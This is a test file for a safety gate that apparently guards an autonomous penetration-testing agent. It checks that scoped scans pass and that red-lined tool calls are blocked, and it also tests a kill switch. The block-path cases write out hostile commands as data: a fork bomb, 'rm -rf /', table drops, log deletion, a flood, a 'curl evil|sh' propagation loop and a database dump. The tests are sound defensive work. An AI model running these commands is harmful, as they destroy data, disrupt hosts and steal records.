/**
 * Red-lines gate tests. As a safety gate, BOTH paths must be proven
 * (typescript-patterns): an allowed action passes, and every prohibited
 * category is blocked BEFORE execution. The enforcement-hook tests assert on
 * the block decision itself (the choke point), not merely a return value.
 */
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { checkRedLines, toInvocation } from "./check.js";
import { extractHosts, normalizeHost, parseScopeHosts } from "./rules.js";

const IN_SCOPE = new Set(["localhost", "10.0.0.5"]);
const ctx = { scopeHosts: IN_SCOPE };

function bash(command: string) {
	return toInvocation("bash", { command });
}

test("allows a benign, in-scope command (allow path)", () => {
	const decision = checkRedLines(bash("nmap -sV 10.0.0.5"), ctx);
	assert.deepEqual(decision, { allowed: true });
});

test("allows normal candidate/validate custom tool calls", () => {
	const rec = checkRedLines(toInvocation("record_sqli_candidate", { endpoint: "http://10.0.0.5/item" }), ctx);
	assert.equal(rec.allowed, true);
	const val = checkRedLines(
		toInvocation("validate_sqli", { finding_id: 1, endpoint: "http://10.0.0.5/item", param: "id", baseline_value: "1" }),
		ctx,
	);
	assert.equal(val.allowed, true);
});

test("blocks an out-of-scope target (scope rule)", () => {
	const decision = checkRedLines(bash("nmap -sV 8.8.8.8"), ctx);
	assert.equal(decision.allowed, false);
	if (decision.allowed) return;
	assert.equal(decision.category, "out_of_scope_scanning");
});

test("scope rule cannot enforce when scope is undefined (documented edge)", () => {
	const decision = checkRedLines(bash("nmap -sV 8.8.8.8"), { scopeHosts: new Set() });
	assert.deepEqual(decision, { allowed: true });
});

test("blocks each prohibited category (block path)", () => {
	const cases: Array<{ category: string; command: string }> = [
		{ category: "denial_of_service", command: "hping3 --flood -p 80 10.0.0.5" },
		{ category: "denial_of_service", command: ":(){ :|:& };:" },
		{ category: "self_propagation", command: "for h in $(cat hosts); do ssh $h 'curl evil|sh'; done" },
		// In-scope source IP so this isolates the false-flag signal; a spoofed
		// OUT-of-scope source would (correctly) trip the scope rule first — both
		// are blocks, but this keeps the category assertion unambiguous.
		{ category: "false_flag_or_evidence_tampering", command: "nmap -S 10.0.0.5 10.0.0.5" },
		{ category: "false_flag_or_evidence_tampering", command: "rm /var/log/auth.log" },
		{ category: "safety_of_life_systems", command: "modbus-cli read 10.0.0.5" },
		{ category: "destructive_or_irreversible", command: "mysql -e 'DROP TABLE users'" },
		{ category: "destructive_or_irreversible", command: "rm -rf /" },
		{ category: "destructive_or_irreversible", command: "mysql -e 'DELETE FROM accounts'" },
		{ category: "sensitive_data_exfiltration", command: "sqlmap -u http://10.0.0.5/ --dump-all" },
	];
	for (const c of cases) {
		const decision = checkRedLines(bash(c.command), ctx);
		assert.equal(decision.allowed, false, `expected block for: ${c.command}`);
		if (!decision.allowed) {
			assert.equal(decision.category, c.category, `wrong category for: ${c.command}`);
		}
	}
});

test("a DELETE with a WHERE clause is not blocked as destructive", () => {
	// The reasoning core reading one row is fine; only unbounded deletes are red-lined.
	const decision = checkRedLines(bash("mysql -e 'DELETE FROM sessions WHERE id=1'"), ctx);
	assert.equal(decision.allowed, true);
});

test("host extraction and scope normalization", () => {
	assert.deepEqual(extractHosts("nmap 10.0.0.5 http://8.8.8.8/x").sort(), ["10.0.0.5", "8.8.8.8"]);
	assert.equal(normalizeHost("127.0.0.1"), "localhost");
	assert.equal(normalizeHost("LOCALHOST"), "localhost");
	assert.ok(parseScopeHosts("in-scope: 10.0.0.5, example.com; localhost").includes("10.0.0.5"));
});

// --- enforcement hook (the choke point) ---------------------------------

async function loadHookHarness(cwd: string) {
	const mod = await import(`./index.js?redlines=${Math.random()}`);
	const handlers: Record<string, Function[]> = {};
	const pi = {
		on(event: string, handler: Function) {
			(handlers[event] ??= []).push(handler);
		},
		registerTool() {},
		registerCommand() {},
	};
	mod.default(pi);
	const fakeCtx = { cwd, shutdown() {}, sessionManager: { getSessionId: () => "t" } };
	for (const h of handlers["session_start"] ?? []) await h({ type: "session_start", reason: "startup" }, fakeCtx);
	return async (toolName: string, input: unknown) => {
		let result: unknown;
		for (const h of handlers["tool_call"] ?? []) {
			result = await h({ type: "tool_call", toolCallId: "c1", toolName, input }, fakeCtx);
		}
		return result as { block?: boolean; reason?: string } | undefined;
	};
}

test("hook blocks a red-lined tool call before execution", async () => {
	process.env["PLUTO_SCOPE_HOSTS"] = "10.0.0.5";
	const cwd = mkdtempSync(join(tmpdir(), "pluto-rl-"));
	const call = await loadHookHarness(cwd);

	const allowed = await call("bash", { command: "nmap -sV 10.0.0.5" });
	assert.equal(allowed, undefined, "in-scope call should pass (undefined = not blocked)");

	const blocked = await call("bash", { command: "rm -rf /" });
	assert.equal(blocked?.block, true, "destructive call must be blocked");
	assert.match(blocked?.reason ?? "", /RED-LINE/);
});

test("hook halts on the kill switch", async () => {
	const cwd = mkdtempSync(join(tmpdir(), "pluto-rl-kill-"));
	writeFileSync(join(cwd, "KILL"), "");
	process.env["PLUTO_KILL_FILE"] = join(cwd, "KILL");
	const call = await loadHookHarness(cwd);

	// Even an otherwise-benign call is halted once the switch is engaged.
	const blocked = await call("bash", { command: "echo hello" });
	assert.equal(blocked?.block, true);
	assert.match(blocked?.reason ?? "", /Kill switch/i);
	delete process.env["PLUTO_KILL_FILE"];
});
